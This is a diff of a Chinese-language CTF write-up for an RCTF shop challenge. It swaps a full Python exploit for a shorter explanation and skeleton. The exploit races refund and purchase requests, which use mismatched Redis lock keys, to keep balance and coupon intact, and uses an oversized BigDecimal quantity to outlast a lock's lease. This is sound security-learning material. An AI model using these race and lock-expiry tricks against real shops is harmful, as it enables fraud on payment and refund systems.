@@ -2,228 +2,101 @@
 
 ## 题目简述
 
-商城下单和退款使用 Redis 锁，但两个流程的锁 key 分别按用户和订单构造，无法互斥。解法并发执行退款和购买目标商品，通过条件竞争保留余额、优惠券和商品状态，最终满足 flag 接口条件。
+题目是一套 Spring Boot 商城。新用户有 `10.00` 元余额和一张 `10.00` 元优惠券；取得 flag 必须同时拥有四种商品的 `COMPLETED` 订单、余额仍为 `10.00`，并且至少有一张未使用优惠券。下单与退款都使用 Redis 锁，但下单按用户加锁 `order:user:<userId>`，退款按订单加锁 `refund:order:<orderId>`，两个流程会并发读写同一用户余额和优惠券状态，却不能互斥。
+
+源码还设计了另一条预期链：`quantity` 以字符串进入 `BigDecimal` 运算，可以人为拖慢下单逻辑直到 3 秒锁过期，再复用尚未标记为已使用的优惠券。
 
 ## 解题过程
 
-### 关键观察
+### flag 条件与关键业务顺序
 
-商城下单和退款使用 Redis 锁，但两个流程的锁 key 分别按用户和订单构造，无法互斥。
+`/api/flag/get` 的检查可以概括为：
 
-### 求解步骤
+```java
+completedProductIds.containsAll(allFourProductIds)
+user.getBalance().compareTo(new BigDecimal("10.00")) == 0
+userCoupons.stream().anyMatch(coupon -> !coupon.getIsUsed())
+```
 
-观察Redis锁，发现买和退款的锁的key值不一样，可以打条件竞争
-exp
-public Map<String, Object> createOrder(String userId, OrderRequestDTO
-orderRequest) {
-    Map<String, Object> result = new HashMap();
-    String lockKey = "order:user:" + userId;
-    String lockValue = this.redisLockUtil.generateLockValue();
-    //...
-}
-public Map<String, Object> refundOrder(String orderId, String userId) {
-    Map<String, Object> result = new HashMap();
-    String lockKey = "refund:order:" + orderId;
-    //...
-}
-import requests
+下单与退款分别使用不同锁域：
+
+```java
+// createOrder
+String lockKey = "order:user:" + userId;       // 3 秒
+
+// refundOrder
+String lockKey = "refund:order:" + orderId;    // 5 秒
+```
+
+下单先读取用户余额，最后写回 `balance - finalPrice`；退款也先读取余额，最后写回 `balance + order.finalPrice`。它们没有数据库行锁或版本条件，因而存在典型的 lost update。
+
+### PDF 中采用的下单/退款竞争
+
+先用优惠券购买任意商品，得到一个 `finalPrice=0` 的 pivot 订单。此时余额仍为 10，但优惠券已使用。随后同时发起：
+
+1. 退款 pivot 订单；退款线程读取余额 10，准备恢复优惠券，并写回 `10 + 0 = 10`。
+2. 不使用优惠券购买目标商品；下单线程也读取余额 10，准备扣除目标价格。
+
+若下单先写入较低余额、退款后写回 10，就会出现以下终态：目标订单为 `COMPLETED`、pivot 订单已退款、余额为 10、优惠券重新可用。由于两条请求的 Redis key 不同，锁不会阻止这个交错。
+
+下面是 PDF 中长脚本的核心骨架；接口返回结构中的 `code`、`data.order.id` 与仓库源码一致：
+
+```python
 import threading
-import time
-import uuid
-
-TARGET_URL = "<http://<challenge-host>:49947>"
-
-PROD_LITTLE = "550e8400-e29b-41d4-a716-446655440001" # 5.50
-PROD_SWEET  = "550e8400-e29b-41d4-a716-446655440002" # 8.80
-PROD_FISH   = "550e8400-e29b-41d4-a716-446655440003" # 4.20
-PROD_LARGE  = "550e8400-e29b-41d4-a716-446655440004" # 10.00
+import requests
 
 s = requests.Session()
+s.headers["Authorization"] = "Bearer <登录得到的 token>"
+base = "https://challenge.example"
 
-CURRENT_USER = {"username": "", "password": ""}
-
-def register_and_login():
-    username = f"hacker_{uuid.uuid4().hex[:8]}"
-    password = "password123"
-    email = f"{username}@hack.com"
-
-    CURRENT_USER["username"] = username
-    CURRENT_USER["password"] = password
-
-    print(f"[*] 注册用户: {username}")
-    try:
-        res = s.post(f"{TARGET_URL}/api/user/register", json={
-            "username": username, "password": password, "email": email
-        })
-
-        if res.json().get("code") != 200:
-            print(f"[-] 注册失败: {res.text}")
-            exit()
-        res = s.post(f"{TARGET_URL}/api/user/login", json={
-            "username": username, "password": password
-        })
-
-        token = res.json()['data']['token']
-        s.headers.update({"Authorization": f"Bearer {token}"})
-        print("[+] token：", token)
-        user_id = res.json()['data']['user']['id']
-        return user_id
-    except Exception as e:
-        print(f"[-] 连接错误: {e}")
-        exit()
-
-def get_coupon_id():
-    try:
-        res = s.get(f"{TARGET_URL}/api/coupon/available")
-        data = res.json().get('data')
-        if data:
-            return data[0]['id']
-    except:
-        pass
-    return None
-
-def get_balance():
-    try:
-        res = s.get(f"{TARGET_URL}/api/user/info")
-        return float(res.json()['data']['balance'])
-    except:
-        return 0.0
-
-def buy(product_id, coupon_id=None):
-    data = {
-        "productId": product_id,
-        "quantity": "1"
-    }
+def buy(product_id, coupon_id=None, quantity="1"):
+    body = {"productId": product_id, "quantity": quantity}
     if coupon_id:
-        data["couponId"] = coupon_id
-
-    try:
-        res = s.post(f"{TARGET_URL}/api/order/create", json=data)
-        return res.json()
-    except:
-        return None
+        body["couponId"] = coupon_id
+    return s.post(f"{base}/api/order/create", json=body).json()
 
 def refund(order_id):
-    try:
-        res = s.post(f"{TARGET_URL}/api/order/refund/{order_id}")
-        return res.json()
-    except:
-        return None
+    return s.post(f"{base}/api/order/refund/{order_id}").json()
 
-def get_my_orders():
-    try:
-        res = s.get(f"{TARGET_URL}/api/order/my")
-        return res.json().get('data', [])
-    except:
-        return []
+def race_one(target_product_id, pivot_product_id, coupon_id):
+    pivot = buy(pivot_product_id, coupon_id)
+    pivot_id = pivot["data"]["order"]["id"]
 
-def clean_up_pivot():
-    orders = get_my_orders()
-    if not orders: return
-    for order in orders:
-        if order['productId'] == PROD_LARGE and order['status'] == 'COMPLETED'
-and order.get('couponId'):
-            refund(order['id'])
+    t_refund = threading.Thread(target=refund, args=(pivot_id,))
+    t_buy = threading.Thread(target=buy, args=(target_product_id,))
+    t_refund.start()
+    t_buy.start()
+    t_refund.join()
+    t_buy.join()
+```
 
-def glitch_item(target_prod_id, target_name):
-    print(f"\\n>>> 尝试: {target_name}")
+竞争并非每次都命中。每轮后应读取 `/api/order/my`、`/api/user/info` 和 `/api/coupon/available`，只在“目标订单完成、余额 10、优惠券仍可用”时保留结果；否则退款异常订单并重试。对 Little Potato、Sweet Potato、Fish Fish、Large Potato 依次完成竞争后，请求 `/api/flag/get`，得到：
 
-    attempt_count = 0
-    while True:
-        attempt_count += 1
-        orders = get_my_orders()
-        has_target = False
-        target_order_id = None
-        for order in orders:
-            if order['productId'] == target_prod_id and order['status'] ==
-'COMPLETED':
-                has_target = True
-                target_order_id = order['id']
-                break
-
-        current_bal = get_balance()
-
-        if has_target and current_bal == 10.0:
-            print(f"[+] 成功！已拥有 {target_name} 且余额为 10.00")
-            if target_prod_id == PROD_LARGE:
-                if get_coupon_id():
-                    print("[+] 优惠券未使用")
-                    break
-                else:
-                    refund(target_order_id)
-                    clean_up_pivot()
-                    continue
-            else:
-                break
-        if has_target and current_bal < 10.0:
-            refund(target_order_id)
-            clean_up_pivot()
-            continue
-        coupon_id = get_coupon_id()
-        if not coupon_id:
-            clean_up_pivot()
-            continue
-        res_buy = buy(PROD_LARGE, coupon_id)
-
-        if not res_buy or res_buy.get('code') != 200:
-            clean_up_pivot()
-            continue
-
-        pivot_order_id = res_buy['data']['order']['id']
-        def thread_refund():
-            refund(pivot_order_id)
-
-        def thread_buy_target():
-            buy(target_prod_id)
-
-        t1 = threading.Thread(target=thread_refund)
-        t2 = threading.Thread(target=thread_buy_target)
-
-        t1.start()
-        t2.start()
-
-        t1.join()
-        t2.join()
-
-def main():
-    user_id = register_and_login()
-    target_list = [
-        (PROD_SWEET, "Sweet Potato (8.80)"),
-        (PROD_LITTLE, "Little Potato (5.50)"),
-        (PROD_FISH, "Fish Fish (4.20)"),
-        (PROD_LARGE, "Large Potato (10.00)")
-    ]
-
-### 跨页补回：exploit 收尾
-
-for prod_id, name in target_list:
-        glitch_item(prod_id, name)
-        time.sleep(0.2)
-
-    bal = get_balance()
-    coupon = get_coupon_id()
-    orders = get_my_orders()
-    completed_count = sum(1 for o in orders if o['status'] == 'COMPLETED')
-
-    print(f"余额: {bal}")
-    print(f"优惠券: {'存在(未使用)' if coupon else '不存在(已使用)'}")
-    print(f"已购商品数: {completed_count}")
-
-    if bal == 10.0 and coupon:
-        res = s.get(f"{TARGET_URL}/api/flag/get")
-        print(res.text)
-    else:
-        print("[-] 失败")
-
-    print(f"Username: {CURRENT_USER['username']}")
-    print(f"Password: {CURRENT_USER['password']}")
-
-if __name__ == "__main__":
-    main()
+```text
 RCTF{G1ft_F0r_U_My_Br0~}
+```
+
+PDF 的四页内容主要是一份完整自动化脚本；原 raw 的“跨页补回”确实属于同一脚本，但长期 WP 不需要保留注册、异常打印和固定题目地址等样板代码，以上骨架保留了决定利用是否成立的状态机。
+
+### 仓库单题 WP 给出的预期解法
+
+`createOrder()` 的顺序是“验证优惠券 → 解析并运算 quantity → 扣余额 → 标记优惠券已使用”，Redis 锁的租期只有 3 秒：
+
+```java
+BigDecimal quantity = new BigDecimal(orderRequest.getQuantity());
+BigDecimal compare = quantity.subtract(new BigDecimal("100"));
+if (compare.compareTo(BigDecimal.ZERO) > 0) {
+    quantityNum = 1;
+    quantity = BigDecimal.ONE;
+}
+```
+
+以 `quantity=1e9999999` 发起第一个带优惠券的订单，超大指数参与 `BigDecimal.subtract()` 会造成数秒计算延迟。优惠券已经通过可用性检查，但还没执行 `useCoupon()`；当 3 秒 Redis 锁过期后，再发送第二个使用同一优惠券的普通订单。两个请求最终都会把数量收敛为 1，却可能都按优惠券可用继续执行。退款其中一个零元订单即可恢复优惠券，再对其余商品重复。
+
+这条链说明 DoS 不只是可用性问题：当锁有固定 TTL 且业务会在锁内处理攻击者可控的高复杂度数据时，延迟可以被转化为一致性漏洞。
 
 ## 方法总结
 
-- 核心技巧：业务锁粒度不一致导致的条件竞争。
-- 识别信号：购买和退款锁 key 维度不同，但修改同一余额/订单状态。
-- 复用要点：构造“退款 pivot 订单 + 购买目标商品”的并发窗口，反复重试直到状态满足。
+- 核心技巧：利用不一致的 Redis 锁粒度制造下单/退款 lost update；预期路线则用 `BigDecimal` 计算延迟耗尽锁租期。
+- 识别信号：多个业务流程修改同一余额/库存/优惠券，却使用不同 lock key；固定 TTL 内存在用户可控的高复杂度运算。
+- 复用要点：先写清需要维持的最终不变量，再用 pivot 订单构造可回滚的竞争；每次并发后都查询真实状态，不要把 HTTP 200 当作竞争成功。
